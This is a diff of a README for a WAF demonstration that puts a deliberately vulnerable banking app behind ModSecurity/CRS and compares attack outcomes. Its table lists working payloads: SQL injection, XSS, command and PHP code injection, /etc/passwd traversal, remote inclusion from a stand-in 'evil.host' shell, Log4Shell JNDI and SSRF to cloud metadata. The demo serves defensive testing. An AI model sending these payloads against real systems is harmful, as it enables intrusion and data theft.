@@ -1,7 +1,12 @@
 # F5 NGINX WAF — live before/after demo
 
 A **runnable** demo (not a slideshow) that proves the value of a WAF in one
-command. It stands up the *same* vulnerable app two ways:
+command. **No license required** — the WAF engine is OWASP Core Rule Set on
+ModSecurity-NGINX, a drop-in stand-in for F5 NGINX App Protect WAF, so the whole
+thing runs on any machine with Docker. (The optional real-F5 path is in
+[`f5-app-protect/`](./f5-app-protect/).)
+
+It stands up the *same* vulnerable app two ways:
 
 - **Directly** on `:8081` — no protection. Attacks land on the code and succeed.
 - **Behind F5 NGINX WAF** on `:8082` — the same attacks are blocked with `403`
@@ -27,30 +32,44 @@ docker compose up --build -d      # start origin (:8081) + WAF (:8082)
 ./run-demo.sh                     # fire the attacks, see before vs after
 ```
 
-Expected result: **6/6 PASS** — every attack blocked by the WAF, every
-legitimate request allowed.
+`run-demo.sh` fires a **comprehensive capability matrix** at both the raw origin
+and the WAF and prints a scorecard — every attack blocked, every legitimate
+request allowed:
 
 ```
-  origin (no WAF)     HTTP 200  EXPLOITED -- attacker got data
-  F5 NGINX WAF        HTTP 403  BLOCKED   -- never reached the app
+  ### Injection & OWASP Top 10
+  SQL injection            origin exploited  WAF 403 BLOCKED
+  Reflected XSS            origin exploited  WAF 403 BLOCKED
   ...
-  Result: 6/6 checks behaved correctly
-  PASS -- WAF blocked every attack and allowed every legit request.
+  Capability scorecard: 17/17 enforced correctly
+  PASS -- every attack blocked, every legitimate request allowed.
 ```
 
 Tear down with `./stop.sh` (or `docker compose down`).
 
-## The four attacks
+## Capabilities demonstrated
 
-The origin (`Acme Bank customer portal`) is deliberately vulnerable. Each
-endpoint has a classic flaw the WAF is meant to stop:
+The origin (`Acme Bank customer portal`) is deliberately vulnerable; each flaw
+maps to a real WAF capability. All verified blocked (`403`) at CRS paranoia
+level 1 while legitimate traffic passes:
 
-| Attack | Endpoint | What the unprotected origin does |
-|--------|----------|----------------------------------|
-| **SQL injection** | `/products?cat=deposit' OR '1'='1` | Dumps the secret user table — password hashes + SSNs |
-| **Reflected XSS** | `/search?q=<script>…</script>` | Echoes the script tag into the page unescaped |
-| **Path traversal** | `/download?file=../../../../etc/passwd` | Reads and returns `/etc/passwd` |
-| **Command injection** | `/ping?host=127.0.0.1;whoami` | Runs `whoami` on the server (returns `root`) |
+| Category | Attack | Example |
+|----------|--------|---------|
+| Injection / OWASP Top 10 | SQL injection | `/products?cat=deposit' OR '1'='1` → dumps hashes + SSNs |
+| | Reflected XSS | `/search?q=<script>…</script>` |
+| | Command injection (RCE) | `/ping?host=127.0.0.1;whoami` |
+| | Code injection (PHP) | `/render?tpl=<?php system('id')?>` |
+| | Path traversal (LFI) | `/download?file=../../../../etc/passwd` |
+| | Remote file inclusion | `/fetch?url=http://evil.host/shell.txt?` |
+| Threat campaigns | Log4Shell (JNDI) | `/lookup?user=${jndi:ldap://…}` |
+| | SSRF (cloud metadata) | `/fetch?url=http://169.254.169.254/…` |
+| Bot & scanner defense | Scanner signatures | `User-Agent: sqlmap` / `nikto` |
+| Protocol enforcement | Disallowed method | `PUT` / `DELETE` |
+
+> Not every class is caught at PL1 — e.g. a bare `;id` command-injection token or
+> `{{7*7}}` template probe slip through. Raising `PARANOIA` in the compose file
+> widens coverage at the cost of more false positives; that tradeoff *is* the
+> demo. `run-demo.sh` uses payloads verified to block at PL1.
 
 See it for yourself against the **unprotected** origin:
 
@@ -104,9 +123,14 @@ subscription or free 30-day trial and ships the real declarative policy,
 
 | Where | How | Docs |
 |-------|-----|------|
-| **Local (Docker)** | `docker compose up` + `./run-demo.sh` | this file |
-| **Kubernetes (k3s)** | `kubectl apply -k k8s/` — origin + WAF pods, hardened, ingress `payments.fictionally.org` → WAF, NetworkPolicy containment | [`k8s/README.md`](./k8s/README.md) |
+| **Local (Docker)** | `docker compose up` + `./run-demo.sh` (comprehensive matrix) | this file |
 | **A single node (SSH + Docker)** | WAF published on one port, origin internal | [`deploy/README.md`](./deploy/README.md) |
+| **Kubernetes (k3s)** | `kubectl apply -k k8s/` — Traefik ingress `payments.fictionally.org` → WAF → origin, hardened pods, NetworkPolicy containment | [`k8s/README.md`](./k8s/README.md) |
+
+The k3s ingress `payments.fictionally.org` is wired to the **node** WAF by
+default (via an external-backend Service → `192.168.1.140:9080`), so the node
+deployment *is* what serves the public hostname. Point it at the in-cluster WAF
+pod instead by setting the ingress backend to `service: waf` / `port: 8080`.
 
 > **`SAFE_MODE`** — the origin's file-read and command-injection flaws are
 > *real* by default (local Docker) so the exploit is genuine. On shared infra
